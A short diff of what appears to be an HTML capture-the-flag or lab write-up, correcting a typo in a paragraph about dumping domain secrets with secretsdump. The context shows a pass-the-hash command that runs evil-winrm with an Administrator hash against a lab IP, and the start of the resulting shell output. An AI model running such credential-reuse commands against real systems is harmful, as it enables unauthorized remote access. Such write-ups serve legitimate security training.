@@ -4959,7 +4959,7 @@ msf6 auxiliary(scanner/smb/impacket/secretsdump) &gt; exploit
 [*] Auxiliary module execution completed
 </code></pre></div>
 </details>
-<p>Secretsdump.py usese the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: <code>evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code></p>
+<p>Secretsdump.py uses the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: <code>evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code></p>
 <details class="output"><summary>evil-winrm output and flags</summary><div class="highlight"><pre><span></span><code>Evil-WinRM shell v3.2
 
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
